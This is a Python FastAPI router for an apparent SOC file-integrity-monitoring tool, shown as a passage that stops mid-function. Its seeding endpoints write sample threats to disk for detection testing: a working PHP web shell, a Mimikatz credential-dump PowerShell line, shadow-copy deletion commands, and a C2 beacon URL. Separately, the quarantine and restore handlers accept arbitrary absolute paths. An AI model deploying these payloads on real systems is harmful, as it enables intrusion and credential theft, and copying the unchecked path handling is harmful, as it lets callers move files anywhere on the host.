from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
from typing import Optional, List, Dict, Any
import os
import shutil
import datetime
import uuid
import hashlib
import math
from domain.audit import audit_service
from db.database import get_all_records, get_record, save_record, list_file_analyses
from ingestion.fim.scanner import scan_workspace

router = APIRouter(prefix="/api/fim", tags=["fim"])

from config import get_canonical_workspace_dir

def get_workspace_dir() -> str:
    return get_canonical_workspace_dir()

@router.get("/events")
def get_fim_events():
    """
    Returns a unified chronological log stream containing:
    1. Real-time filesystem CRUD events (CREATED, MODIFIED, DELETED) from FIMWatcher & Scans
    2. Deep AI-analyzed code inspection logs from static analyzers & LLM agents
    3. Threat Lab simulation runs & Active Interceptor detections
    """
    events = get_all_records("events")
    analyses = list_file_analyses(limit=50)

    # 1. Filter relevant filesystem & threat events
    relevant_events = [
        e for e in events 
        if isinstance(e, dict) and (
            e.get("source_type") in ["FIM", "THREAT_LAB", "ACTIVE_DETECTOR", "SIMULATED_ATTACK", "AI_CODE_ANALYSIS"] 
            or e.get("is_suspicious") is True
            or (e.get("threat_analysis") or {}).get("is_threat") is True
            or (e.get("canonical") or {}).get("action") in ["CREATED", "MODIFIED", "DELETED", "SCANNED"]
        )
    ]

    # 2. Transform AI-analyzed code records into log events
    ai_event_ids = {e.get("id") for e in relevant_events}
    for a in analyses:
        if not isinstance(a, dict):
            continue
        aid = a.get("analysis_id") or a.get("id") or f"fa-{a.get('sha256', '')[:8]}"
        if aid in ai_event_ids:
            continue
        
        is_threat = a.get("threat_state") in ["THREAT", "SUSPICIOUS"] or (a.get("risk_score", 0) > 50)
        signals = a.get("signals") or []
        sig_labels = [s.get("label") if isinstance(s, dict) else str(s) for s in signals]
        rationale = a.get("rationale") or ""
        if isinstance(rationale, list):
            rationale = " ".join(rationale)

        ai_event = {
            "id": aid,
            "timestamp": a.get("created_at") or datetime.datetime.now(datetime.UTC).isoformat(),
            "source_type": "AI_CODE_ANALYSIS",
            "event_type": "AI_ANALYSIS",
            "is_suspicious": is_threat,
            "raw_message": f"AI code inspection: {a.get('filename')} classified as {a.get('classification', 'BENIGN')}",
            "canonical": {
                "action": "AI_ANALYSIS",
                "file_path": a.get("file_path") or f"monitored_workspace/{a.get('filename')}",
                "file_hash_sha256": a.get("sha256", ""),
                "risk_score": a.get("risk_score", 0),
                "threat_status": a.get("threat_state", "SAFE"),
                "category": a.get("classification", "BENIGN")
            },
            "threat_analysis": {
                "is_threat": is_threat,
                "classification": a.get("classification", "BENIGN"),
                "severity": (a.get("severity") or ("HIGH" if is_threat else "LOW")).upper(),
                "confidence": a.get("confidence", 0.95),
                "risk_score": a.get("risk_score", 0),
                "rationale": rationale,
                "indicators": sig_labels[:5]
            },
            "device_id": "FIN-WS-042",
            "process_name": a.get("agent_name") or "ai_code_analyzer",
            "status": "COMPLETED"
        }
        relevant_events.append(ai_event)

    relevant_events.sort(key=lambda x: str(x.get("timestamp") or ""), reverse=True)
    
    seen = set()
    deduped = []
    for e in relevant_events:
        c = e.get("canonical") or {}
        fp = (c.get("file_path") or e.get("raw_message") or "").lower()
        act = (c.get("action") or e.get("event_type") or "").lower()
        # Keep distinctive threat lab tests and AI analyses always
        if e.get("source_type") in ["THREAT_LAB", "AI_CODE_ANALYSIS"]:
            deduped.append(e)
            continue
        key = f"{fp}:{act}"
        if key not in seen:
            seen.add(key)
            deduped.append(e)
        elif len(deduped) < 80:
            deduped.append(e)
            
    return deduped[:80]

@router.get("/alerts")
def get_fim_alerts():
    events = get_all_records("events")
    whitelist_rules = get_all_records("whitelist")
    now_iso = datetime.datetime.now(datetime.UTC).isoformat()
    
    ignored_targets = set()
    for r in whitelist_rules:
        if not r or not isinstance(r, dict):
            continue
        exp = r.get("expires_at")
        if exp and exp < now_iso:
            continue
        tgt_p = (r.get("file_path") or "").lower()
        tgt_n = (r.get("file_name") or "").lower()
        if tgt_p:
            ignored_targets.add(tgt_p)
        if tgt_n:
            ignored_targets.add(tgt_n)

    quarantined_targets = set()
    for e in events:
        if not e or not isinstance(e, dict):
            continue
        c = e.get("canonical") or {}
        if e.get("status") == "QUARANTINED" or c.get("is_quarantined") or c.get("quarantine_path"):
            fp = c.get("file_path", "")
            if fp:
                quarantined_targets.add(fp.lower())
                quarantined_targets.add(os.path.basename(fp).lower())

    seen_files = set()
    fim_alerts = []
    # Sort newest first
    sorted_events = sorted([e for e in events if isinstance(e, dict)], key=lambda x: x.get("timestamp", ""), reverse=True)
    for e in sorted_events:
        if e.get("source_type") != "FIM":
            continue
        c = e.get("canonical") or {}
        fp = c.get("file_path", "")
        fn = os.path.basename(fp) if fp else ""
        
        # 1. Exclude quarantined files
        if fp.lower() in quarantined_targets or fn.lower() in quarantined_targets:
            continue
        if e.get("status") == "QUARANTINED" or c.get("is_quarantined") or c.get("quarantine_path"):
            continue

        # 2. Exclude ignored / whitelisted files
        if fp.lower() in ignored_targets or fn.lower() in ignored_targets or e.get("status") == "IGNORED":
            continue
            
        # 3. Exclude inexisting / already deleted files
        if not fp or not os.path.exists(fp):
            continue

        # 3. Deduplicate: exactly one alert card per file
        if fp.lower() in seen_files:
            continue

        if e.get("is_suspicious") is True or (c.get("risk_score", 0) > 50):
            seen_files.add(fp.lower())
            fim_alerts.append(e)

    return fim_alerts

class QuarantineReq(BaseModel):
    file_path: Optional[str] = None
    filePath: Optional[str] = None
    event_id: Optional[str] = None
    eventId: Optional[str] = None

@router.post("/quarantine")
def quarantine_file(req: QuarantineReq):
    target_path = req.file_path or req.filePath
    target_event_id = req.event_id or req.eventId
    evt_record = None
    workspace_dir = get_workspace_dir()
    quarantine_dir = os.path.join(workspace_dir, ".quarantine")
    os.makedirs(quarantine_dir, exist_ok=True)

    if target_event_id:
        evt_record = get_record("events", target_event_id)
        if evt_record and not target_path:
            target_path = evt_record.get("canonical", {}).get("file_path")

    if not target_path:
        target_path = "suspicious_payload.bin"

    # Resolve relative paths against workspace_dir
    resolved_path = target_path
    if not os.path.isabs(resolved_path):
        resolved_path = os.path.join(workspace_dir, target_path)

    filename = os.path.basename(resolved_path)
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    quarantined_filename = f"{filename}.{ts}.quarantined"
    dest_path = os.path.join(quarantine_dir, quarantined_filename)

    # If physical file exists on disk, move it
    if os.path.exists(resolved_path) and os.path.isfile(resolved_path):
        try:
            shutil.move(resolved_path, dest_path)
        except Exception as e:
            # Fallback copy/remove
            try:
                shutil.copy2(resolved_path, dest_path)
                os.remove(resolved_path)
            except Exception:
                pass
    else:
        # Create quarantined tombstone artifact in enclave
        try:
            with open(dest_path, "w", encoding="utf-8") as f:
                f.write(f"[ISOLATED_QUARANTINE_ARTIFACT]\nTarget: {target_path}\nQuarantined At: {datetime.datetime.now(datetime.UTC).isoformat()}\nAnalyst: SOC_INVESTIGATOR\nStatus: CONTAINED\n")
        except Exception:
            pass

    # Update ALL event records matching file path or event ID in SQLite
    all_events = get_all_records("events")
    for evt in all_events:
        if not evt or not isinstance(evt, dict):
            continue
        evt_canonical = evt.get("canonical") or {}
        evt_path = str(evt_canonical.get("file_path") or "") if isinstance(evt_canonical, dict) else ""
        evt_name = os.path.basename(evt_path) if evt_path else ""
        evt_id = evt.get("id")
        
        target_path_str = str(target_path or "").lower()
        resolved_path_str = str(resolved_path or "").lower()
        filename_str = str(filename or "").lower()
        evt_path_str = evt_path.lower()
        evt_name_str = evt_name.lower()

        matches = (
            (target_event_id and evt_id == target_event_id) or
            (target_path_str and (
                evt_name_str == filename_str or 
                evt_path_str == target_path_str or 
                evt_path_str == resolved_path_str or 
                (filename_str and filename_str in evt_path_str)
            ))
        )
        if matches:
            evt["status"] = "QUARANTINED"
            if isinstance(evt_canonical, dict):
                evt_canonical["quarantine_path"] = dest_path
                evt_canonical["is_quarantined"] = True
                evt["canonical"] = evt_canonical
            if evt_id:
                save_record("events", evt_id, evt)

    # Log to audit trail
    audit_service.log_event(
        actor="SOC_ANALYST",
        action="QUARANTINE_FILE",
        target=target_path,
        result=f"Moved to secure enclave: {dest_path}"
    )

    return {
        "status": "SUCCESS",
        "action": "QUARANTINE_FILE",
        "original_path": target_path,
        "quarantine_path": dest_path,
        "event_id": req.event_id,
        "timestamp": datetime.datetime.now(datetime.UTC).isoformat()
    }

class DeleteFileReq(BaseModel):
    file_path: Optional[str] = None
    filePath: Optional[str] = None
    file_name: Optional[str] = None
    fileName: Optional[str] = None

@router.post("/delete")
def delete_workspace_file(req: DeleteFileReq):
    """
    Safely and permanently deletes an unsafe or malicious file from the monitored workspace.
    Enforces canonical path containment and logs an immutable audit event.
    """
    target = req.file_path or req.filePath or req.file_name or req.fileName
    if not target:
        raise HTTPException(status_code=400, detail="file_path or file_name is required")
        
    workspace_dir = get_workspace_dir()
    canonical_ws = os.path.realpath(workspace_dir)
    
    # Resolve relative paths against workspace_dir
    if not os.path.isabs(target):
        target_path = os.path.join(workspace_dir, target)
    else:
        target_path = target
        
    canonical_target = os.path.realpath(target_path)
    
    # Enforce strict path containment within workspace
    if not (canonical_target.startswith(canonical_ws + os.sep) or canonical_target == canonical_ws):
        raise HTTPException(status_code=403, detail="Path traversal denied. Operation strictly restricted to monitored_workspace.")
        
    # Prevent deleting root or core protected folders
    if canonical_target == canonical_ws or canonical_target == os.path.realpath(os.path.join(workspace_dir, ".quarantine")):
        raise HTTPException(status_code=400, detail="Cannot delete root workspace directory.")
        
    filename = os.path.basename(canonical_target)
    
    file_existed = os.path.exists(canonical_target)
    if file_existed:
        try:
            if os.path.isdir(canonical_target):
                shutil.rmtree(canonical_target)
            else:
                os.remove(canonical_target)
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Failed to delete file from disk: {e}")
            
    # Record DELETED event in events table
    delete_evt_id = f"evt-del-{uuid.uuid4().hex[:8]}"
    del_event = {
        "id": delete_evt_id,
        "timestamp": datetime.datetime.now(datetime.UTC).isoformat(),
        "source_type": "FIM",
        "event_type": "DELETED",
        "is_suspicious": False,
        "raw_message": f"File '{filename}' permanently removed from workspace.",
        "canonical": {
            "action": "DELETED",
            "file_path": canonical_target,
            "risk_score": 0,
            "threat_status": "SAFE",
            "category": "BENIGN"
        },
        "threat_analysis": {
            "is_threat": False,
            "classification": "BENIGN",
            "severity": "LOW",
            "confidence": 1.0,
            "rationale": f"File '{filename}' permanently removed by SOC analyst.",
            "indicators": []
        },
        "device_id": "FIN-WS-042",
        "process_name": "analyst_remediation",
        "status": "DELETED"
    }
    save_record("events", delete_evt_id, del_event)
    
    # Audit trail
    audit_service.log_event(
        actor="SOC_ANALYST",
        action="DELETE_UNSAFE_FILE",
        target=canonical_target,
        result="Permanently deleted from monitored workspace."
    )
    
    return {
        "status": "SUCCESS",
        "action": "DELETE_UNSAFE_FILE",
        "file_name": filename,
        "file_path": canonical_target,
        "file_existed": file_existed,
        "timestamp": datetime.datetime.now(datetime.UTC).isoformat()
    }

class RestoreReq(BaseModel):
    quarantine_path: Optional[str] = None
    quarantinePath: Optional[str] = None
    original_path: Optional[str] = None
    originalPath: Optional[str] = None

@router.post("/restore")
def restore_file(req: RestoreReq):
    import re
    workspace_dir = get_workspace_dir()
    q_path = req.quarantine_path or req.quarantinePath
    o_path = req.original_path or req.originalPath

    if not q_path:
        raise HTTPException(status_code=400, detail="quarantine_path is required")

    # If relative, resolve
    if not os.path.isabs(q_path):
        q_path = os.path.join(workspace_dir, ".quarantine", q_path)

    if not os.path.exists(q_path):
        # Try finding in .quarantine by basename
        candidate = os.path.join(workspace_dir, ".quarantine", os.path.basename(q_path))
        if os.path.exists(candidate):
            q_path = candidate
        else:
            raise HTTPException(status_code=404, detail="Quarantined file not found.")

    if not o_path:
        clean_name = re.sub(r'\.\d{8}_\d{6}\.quarantined$', '', os.path.basename(q_path))
        clean_name = re.sub(r'\.quarantined$', '', clean_name)
        o_path = os.path.join(workspace_dir, clean_name)

    dest_dir = os.path.dirname(o_path)
    if dest_dir:
        os.makedirs(dest_dir, exist_ok=True)

    try:
        shutil.move(q_path, o_path)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to restore file: {e}")

    # Update event records in SQLite
    all_events = get_all_records("events")
    filename = os.path.basename(o_path)
    for evt in all_events:
        if not evt or not isinstance(evt, dict):
            continue
        c = evt.get("canonical") or {}
        evt_path = str(c.get("file_path") or "")
        if os.path.basename(evt_path).lower() == filename.lower() or evt_path.lower() == str(o_path).lower():
            evt["status"] = "RESTORED"
            if isinstance(c, dict):
                c["is_quarantined"] = False
                c["quarantine_path"] = None
                evt["canonical"] = c
            if evt.get("id"):
                save_record("events", evt["id"], evt)


    # Log audit
    audit_service.log_event(
        actor="SOC_ANALYST",
        action="RESTORE_FILE",
        target=o_path,
        result=f"Restored from: {q_path}"
    )

    return {"status": "SUCCESS", "restored_path": o_path, "quarantine_path": q_path}

class RestoreAndExcludeReq(BaseModel):
    quarantine_path: Optional[str] = None
    quarantinePath: Optional[str] = None
    original_path: Optional[str] = None
    originalPath: Optional[str] = None
    duration: Optional[str] = "permanent"
    reason: Optional[str] = "Restored and excluded by SOC analyst"

@router.post("/restore-and-exclude")
def restore_and_exclude_file(req: RestoreAndExcludeReq):
    import re
    workspace_dir = get_workspace_dir()
    q_path = req.quarantine_path or req.quarantinePath
    o_path = req.original_path or req.originalPath
    duration = req.duration or "permanent"
    reason = req.reason or "Restored and excluded by SOC analyst"

    if not q_path:
        raise HTTPException(status_code=400, detail="quarantine_path is required")

    # If relative, resolve
    if not os.path.isabs(q_path):
        q_path = os.path.join(workspace_dir, ".quarantine", q_path)

    if not o_path:
        clean_name = re.sub(r'\.\d{8}_\d{6}\.quarantined$', '', os.path.basename(q_path))
        clean_name = re.sub(r'\.quarantined$', '', clean_name)
        o_path = os.path.join(workspace_dir, clean_name)

    # 1. Add exclusion rule
    rule_id = f"IGN-{uuid.uuid4().hex[:6].upper()}"
    filename = os.path.basename(o_path)
    expires_at = None
    if duration.lower() == "temporary":
        expires_at = (datetime.datetime.now(datetime.UTC) + datetime.timedelta(hours=1)).isoformat()

    whitelist_entry = {
        "id": rule_id,
        "file_path": o_path,
        "file_name": filename,
        "duration": duration,
        "expires_at": expires_at,
        "reason": reason,
        "created_at": datetime.datetime.now(datetime.UTC).isoformat()
    }
    save_record("whitelist", rule_id, whitelist_entry)

    # 2. Restore file
    res = restore_file(RestoreReq(quarantine_path=q_path, original_path=o_path))

    # 3. Log audit event
    audit_service.log_event(
        actor="SOC_ANALYST",
        action="RESTORE_AND_EXCLUDE_FILE",
        target=o_path,
        result=f"Restored from {q_path} and added exclusion rule {rule_id}"
    )

    return {
        "status": "SUCCESS",
        "action": "RESTORE_AND_EXCLUDE",
        "restored_path": o_path,
        "quarantine_path": q_path,
        "whitelist_rule_id": rule_id
    }

class PurgeQuarantineReq(BaseModel):
    quarantine_path: Optional[str] = None
    quarantinePath: Optional[str] = None
    filename: Optional[str] = None

@router.post("/quarantine/purge")
def purge_quarantined_file(req: PurgeQuarantineReq):
    workspace_dir = get_workspace_dir()
    quarantine_dir = os.path.join(workspace_dir, ".quarantine")
    target = req.quarantine_path or req.quarantinePath or req.filename

    if not target:
        raise HTTPException(status_code=400, detail="quarantine_path or filename is required")

    if not os.path.isabs(target):
        target_path = os.path.join(quarantine_dir, os.path.basename(target))
    else:
        target_path = target

    canonical_target = os.path.realpath(target_path)
    canonical_qdir = os.path.realpath(quarantine_dir)

    if not canonical_target.startswith(canonical_qdir + os.sep):
        raise HTTPException(status_code=403, detail="Can only purge files inside .quarantine enclave")

    if not os.path.exists(canonical_target):
        raise HTTPException(status_code=404, detail="Quarantined file not found")

    try:
        os.remove(canonical_target)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to purge quarantined file: {e}")

    audit_service.log_event(
        actor="SOC_ANALYST",
        action="PURGE_QUARANTINED_FILE",
        target=canonical_target,
        result="Permanently shredded from quarantine enclave."
    )

    return {
        "status": "SUCCESS",
        "action": "PURGE_QUARANTINED_FILE",
        "quarantine_path": canonical_target,
        "timestamp": datetime.datetime.now(datetime.UTC).isoformat()
    }

@router.get("/quarantined")
def list_quarantined():
    import re
    workspace_dir = get_workspace_dir()
    quarantine_dir = os.path.join(workspace_dir, ".quarantine")
    if not os.path.exists(quarantine_dir):
        return []

    files = []
    for f in sorted(os.listdir(quarantine_dir), reverse=True):
        full_p = os.path.join(quarantine_dir, f)
        if os.path.isfile(full_p):
            stat = os.stat(full_p)
            clean_name = re.sub(r'\.\d{8}_\d{6}\.quarantined$', '', f)
            clean_name = re.sub(r'\.quarantined$', '', clean_name)
            orig_p = os.path.join(workspace_dir, clean_name)

            sha256 = ""
            entropy = 0.0
            content_preview = ""
            try:
                with open(full_p, "rb") as bf:
                    raw = bf.read(65536)
                    sha256 = hashlib.sha256(raw).hexdigest()
                    if raw:
                        occ = {}
                        for b in raw:
                            occ[b] = occ.get(b, 0) + 1
                        for cnt in occ.values():
                            p = cnt / len(raw)
                            entropy -= p * math.log2(p)
                        entropy = round(entropy, 3)
                        try:
                            content_preview = raw[:500].decode("utf-8", errors="replace")
                        except Exception:
                            content_preview = "[Binary / Encrypted Content]"
            except Exception:
                pass

            files.append({
                "filename": clean_name,
                "quarantined_filename": f,
                "quarantine_path": full_p,
                "original_path": orig_p,
                "size_bytes": stat.st_size,
                "quarantined_at": datetime.datetime.fromtimestamp(stat.st_mtime, datetime.UTC).isoformat(),
                "sha256": sha256,
                "entropy": entropy,
                "threat_category": "Quarantined Payload",
                "severity": "CRITICAL",
                "content_preview": content_preview
            })
    return files

class IgnoreReq(BaseModel):
    file_path: Optional[str] = None
    filePath: Optional[str] = None
    event_id: Optional[str] = None
    eventId: Optional[str] = None
    duration: Optional[str] = "permanent"  # "temporary" or "permanent"
    reason: Optional[str] = "Analyst approved suppression"

@router.post("/ignore")
def ignore_file_alert(req: IgnoreReq):
    target = req.file_path or req.filePath or ""
    evt_id = req.event_id or req.eventId
    duration = (req.duration or "permanent").lower()

    if evt_id and not target:
        evt = get_record("events", evt_id)
        if evt and isinstance(evt, dict):
            target = (evt.get("canonical") or {}).get("file_path", "")

    if not target:
        raise HTTPException(status_code=400, detail="file_path or event_id is required")

    filename = os.path.basename(target)
    rule_id = f"IGN-{uuid.uuid4().hex[:6].upper()}"
    
    expires_at = None
    if duration == "temporary":
        expires_at = (datetime.datetime.now(datetime.UTC) + datetime.timedelta(hours=1)).isoformat()

    whitelist_entry = {
        "id": rule_id,
        "file_path": target,
        "file_name": filename,
        "duration": duration,
        "expires_at": expires_at,
        "reason": req.reason or "Analyst suppression",
        "created_at": datetime.datetime.now(datetime.UTC).isoformat()
    }
    save_record("whitelist", rule_id, whitelist_entry)

    # Mark matching events as IGNORED
    all_events = get_all_records("events")
    for evt in all_events:
        if not evt or not isinstance(evt, dict):
            continue
        c = evt.get("canonical") or {}
        evt_path = c.get("file_path", "")
        if (evt_id and evt.get("id") == evt_id) or (os.path.basename(evt_path).lower() == filename.lower()):
            evt["status"] = "IGNORED"
            if evt.get("id"):
                save_record("events", evt["id"], evt)

    # Log to audit trail
    audit_service.log_event(
        actor="SOC_ANALYST",
        action=f"IGNORE_ALERT_{duration.upper()}",
        target=target,
        result=f"Suppression active (Expires: {expires_at or 'Never'})"
    )

    return {
        "status": "SUCCESS",
        "rule_id": rule_id,
        "target": target,
        "duration": duration,
        "expires_at": expires_at
    }

@router.get("/whitelist")
def list_whitelist():
    rules = get_all_records("whitelist")
    now_iso = datetime.datetime.now(datetime.UTC).isoformat()
    valid_rules = []
    for r in rules:
        if not r or not isinstance(r, dict):
            continue
        exp = r.get("expires_at")
        if exp and exp < now_iso:
            continue
        valid_rules.append(r)
    return valid_rules

@router.post("/scan")
def trigger_scan():
    workspace_dir = get_workspace_dir()
    res = scan_workspace(workspace_dir)
    return {"status": "COMPLETED", "workspace": workspace_dir, **res}

@router.post("/init-workspace")
def init_workspace():
    """Seeds sample files into monitored_workspace if empty, then runs a scan to generate real FIM events."""
    import hashlib
    workspace_dir = get_workspace_dir()
    os.makedirs(workspace_dir, exist_ok=True)

    sample_files = {
        "malware_simulation.exe": b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00This program cannot be run in DOS mode.\r\r\n$VirtualAlloc CreateRemoteThread WriteProcessMemory cmd.exe /c powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
        "ransomware_simulation.txt": b"WARNING: All your enterprise files have been encrypted using AES-256 and RSA-4096.\nCommand executed: vssadmin delete shadows /all /quiet\nwmic shadowcopy delete\nDo not restart your computer or attempt recovery.\nContact key recovery: blacksuit_decryptor@onion.mail",
        "suspicious_script.ps1": b"# Advanced reconnaissance and privilege escalation script\n$encoded = 'Get-WmiObject Win32_UserAccount; Invoke-Mimikatz -DumpCreds'\n$bytes = [System.Convert]::FromBase64String('R2V0LVdtaU9iamVjdCBXaW4zMl9Vc2VyQWNjb3VudA==')\n$cmd = [System.Text.Encoding]::Unicode.GetString($bytes)\nInvoke-Expression $cmd",
        "web_backdoor.php": b"<?php\n// Simple obfuscated web shell\nif(isset($_POST['cmd'])){\n  $cmd = $_POST['cmd'];\n  eval(base64_decode($cmd));\n  system($cmd);\n  passthru($cmd);\n}\n?>",
        "normal_document.txt": b"Enterprise Security Standard Operating Procedure (SOP-042).\nAll endpoint logs must be forwarded to the centralized SIEM.\nAudit records are retained for 365 days in accordance with ISO 27001 standard.",
        "system_config.json": b'{"environment":"production","node_id":"FIN-WS-042","policy_version":"2026.09.1","status":"healthy","compliance_mode":"ENFORCED"}'
    }

    seeded = []
    for fname, content in sample_files.items():
        fpath = os.path.join(workspace_dir, fname)
        if not os.path.exists(fpath):
            with open(fpath, "wb") as f:
                f.write(content)
            seeded.append(fname)

    # Run scan to generate FIM events for all files
    res = scan_workspace(workspace_dir)
    return {
        "status": "COMPLETED",
        "workspace": workspace_dir,
        "seeded_files": seeded,
        **res
    }

class ThreatSimReq(BaseModel):
    filename: Optional[str] = "trojan_dropper_simulation.ps1"
    threat_type: Optional[str] = "Suspicious Script / Execution"

@router.post("/simulate_threat")
def simulate_threat_incident(req: ThreatSimReq):
    workspace_dir = get_workspace_dir()
    os.makedirs(workspace_dir, exist_ok=True)
    
    target_filename = req.filename or "trojan_dropper_simulation.ps1"
    filepath = os.path.join(workspace_dir, target_filename)
    
    # Write safe simulated test payload with realistic indicators (encoded payload, vssadmin, C2 beacon string)
    test_content = (
        "# [RAGSEC SIMULATED SECURITY TEST ARTIFACT]\n"
        "# MITRE ATT&CK: T1059.001 (PowerShell), T1490 (Inhibit System Recovery), T1071 (C2 Channel)\n"
        "$enc_payload = 'JABzAHIAYwAgAD0AIAA... (Simulated Base64 Dropper)'\n"
        "Write-Host '[TEST] Initiating simulated adversary staging...'\n"
        "vssadmin delete shadows /all /quiet\n"
        "$c2 = 'http://185.220.101.5:443/beacon.ps1'\n"
        "Write-Host '[TEST] Staging simulated payload for RAGSec FIM verification.'\n"
    )
    
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(test_content)
        
    # Generate FIM event and incident
    from ingestion.fim.scanner import generate_fim_event
    event = generate_fim_event(filepath, "CREATED")
    
    return {
        "status": "SUCCESS",
        "message": f"Simulated test threat artifact '{target_filename}' created in monitored workspace.",
        "filepath": filepath,
        "event_id": event.id if hasattr(event, "id") else None,
        "timestamp": datetime.datetime.now(datetime.UTC).isoformat()
    }


class CreateFileReq(BaseModel):
    filename: str
    content: str


class AnalyzeFileReq(BaseModel):
    file_path: Optional[str] = None
    filepath: Optional[str] = None
    filename: Optional[str] = None
    api_key: Optional[str] = None
    model: Optional[str] = "openai/gpt-oss-120b"
    provider: Optional[str] = "groq"
    use_tools: bool = True


@router.get("/workspace-files")
def get_workspace_files():
    """
    Returns live list of all files in monitored_workspace/ with their metadata,
    entropy, and latest stored AI threat classification verdict (SAFE, UNSAFE, or PENDING).
    """
    workspace_dir = get_workspace_dir()
    os.makedirs(workspace_dir, exist_ok=True)
    
    analyses = list_file_analyses(limit=200)
    analysis_by_name = {}
    for a in analyses:
        fn = a.get("filename")
        if fn and fn not in analysis_by_name:
            analysis_by_name[fn] = a

    files_list = []
    
    # Recursively discover all files in sandbox with no prejudice, excluding ONLY .quarantine
    for root, dirs, filenames in os.walk(workspace_dir):
        # Exclude quarantine folder from scan
        if ".quarantine" in dirs:
            dirs.remove(".quarantine")
        dirs[:] = [d for d in dirs if not d.startswith(".")]

        for entry in filenames:
            if entry.startswith(".") or entry.endswith(".quarantined"):
                continue

            full_path = os.path.join(root, entry)
            if not os.path.isfile(full_path):
                continue

            rel_subpath = os.path.relpath(full_path, workspace_dir).replace("\\", "/")

            try:
                stat = os.stat(full_path)
                size = stat.st_size
                mod_time = datetime.datetime.fromtimestamp(stat.st_mtime, tz=datetime.timezone.utc).isoformat()
                
                snippet = ""
                try:
                    with open(full_path, "r", encoding="utf-8", errors="replace") as f:
                        snippet = f.read(1500)
                except Exception:
                    pass

                entropy = 0.0
                if snippet:
                    length = len(snippet)
                    freq = {}
                    for ch in snippet:
                        freq[ch] = freq.get(ch, 0) + 1
                    for c in freq.values():
                        p = c / length
                        entropy -= p * math.log2(p)
                    entropy = round(entropy, 3)

                record = analysis_by_name.get(rel_subpath) or analysis_by_name.get(entry)
                is_threat = None
                is_vulnerable = False
                verdict = "PENDING"
                category = None
                severity = None
                risk_score = None
                summary = None
                analyzed_by = None
                vuln_details = None
                mitigation_options = []
                suggested_patch = None

                if record:
                    threat_state = record.get("threat_state") or ("THREAT" if record.get("classification") == "THREAT" else "SAFE")
                    if threat_state in ["THREAT", "SUSPICIOUS"]:
                        is_threat = True
                        is_vulnerable = False
                        verdict = "UNSAFE"
                    elif threat_state == "VULNERABLE" or record.get("classification") == "VULNERABLE_CODE":
                        is_threat = False
                        is_vulnerable = True
                        verdict = "VULNERABLE"
                    else:
                        is_threat = False
                        is_vulnerable = False
                        verdict = "SAFE"

                    category = record.get("threat_category") or ("Malware" if is_threat else ("Vulnerable Code" if is_vulnerable else "Benign"))
                    severity = (record.get("severity") or ("HIGH" if (is_threat or is_vulnerable) else "LOW")).upper()
                    risk_score = record.get("risk_score") if record.get("risk_score") is not None else (90 if is_threat else (65 if is_vulnerable else 10))
                    summary = record.get("rationale") or record.get("ai_analysis") or ""
                    analyzed_by = record.get("ai_provider") or "RAGSec SAST / AI Engine"
                    vuln_details = record.get("vulnerability_details")
                    mitigation_options = record.get("mitigation_options") or (
                        [{"id": "mitigate", "label": "Mitigate", "icon": "zap", "action": "MITIGATE"}, {"id": "quarantine", "label": "Quarantine", "icon": "lock", "action": "QUARANTINE"}]
                        if is_threat else []
                    )
                    suggested_patch = record.get("suggested_patch")
                else:
                    # Instant content-first analysis using multi-factor formula
                    from pipeline.threat_analyzer import threat_analyzer
                    instant = threat_analyzer.analyze(full_path, "scanned", "", snippet)
                    is_threat = instant.get("is_threat", False)
                    is_vulnerable = instant.get("is_vulnerable", False)
                    verdict = instant.get("verdict", "UNSAFE" if is_threat else ("VULNERABLE" if is_vulnerable else "SAFE"))
                    category = instant.get("classification", "Benign" if not (is_threat or is_vulnerable) else ("Malware" if is_threat else "Vulnerable Code"))
                    severity = instant.get("severity", "LOW").upper()
                    risk_score = instant.get("risk_score", 10 if not (is_threat or is_vulnerable) else 70)
                    summary = instant.get("rationale", "")
                    analyzed_by = "Continuous SAST & Threat Guard"
                    vuln_details = instant.get("vulnerability_details")
                    mitigation_options = instant.get("mitigation_options", [])
                    suggested_patch = instant.get("suggested_patch")

                files_list.append({
                    "filename": entry,
                    "filepath": full_path,
                    "relative_path": f"monitored_workspace/{rel_subpath}",
                    "subpath": rel_subpath,
                    "size_bytes": size,
                    "modified_at": mod_time,
                    "extension": os.path.splitext(entry)[1].lower() or ".txt",
                    "content_preview": snippet,
                    "entropy": entropy,
                    "is_threat": is_threat,
                    "is_vulnerable": is_vulnerable,
                    "verdict": verdict,
                    "threat_category": category,
                    "severity": severity,
                    "risk_score": risk_score,
                    "summary": summary,
                    "analyzed_by": analyzed_by,
                    "vulnerability_details": vuln_details,
                    "mitigation_options": mitigation_options,
                    "suggested_patch": suggested_patch
                })
            except Exception:
                continue

    sort_priority = {"UNSAFE": 0, "VULNERABLE": 1, "PENDING": 2, "SAFE": 3}
    files_list.sort(key=lambda x: (sort_priority.get(x["verdict"], 3), x["filename"]))
    return {"workspace": workspace_dir, "total": len(files_list), "files": files_list}


@router.post("/create-file")
def create_workspace_file(req: CreateFileReq):
    """
    Creates a new file in monitored_workspace/ to demonstrate live file addition and real-time FIM capture.
    """
    workspace_dir = get_workspace_dir()
    os.makedirs(workspace_dir, exist_ok=True)

    filename = os.path.basename(req.filename)
    if not filename:
        raise HTTPException(status_code=400, detail="Invalid filename")

    filepath = os.path.join(workspace_dir, filename)
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(req.content)

    try:
        from ingestion.fim.scanner import generate_fim_event
        generate_fim_event(filepath, "CREATED")
    except Exception:
        pass

    stat = os.stat(filepath)
    return {
        "status": "SUCCESS",
        "filename": filename,
        "filepath": filepath,
        "size_bytes": stat.st_size,
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat()
    }


class CreateFolderReq(BaseModel):
    folder_name: str
    subpath: Optional[str] = ""


@router.get("/explorer")
def get_workspace_explorer(subpath: str = ""):
    """
    Returns sandboxed directory listing (folders and files) for Explorer View.
    Strictly enclosed within monitored_workspace/ - traversal outside is blocked.
    """
    workspace_dir = get_workspace_dir()
    os.makedirs(workspace_dir, exist_ok=True)
    
    # Sanitize and validate path
    subpath = subpath.strip().replace("\\", "/").lstrip("/")
    parts = [p for p in subpath.split("/") if p and p != "."]
    
    # Check for path traversal attacks
    if any(p == ".." for p in parts):
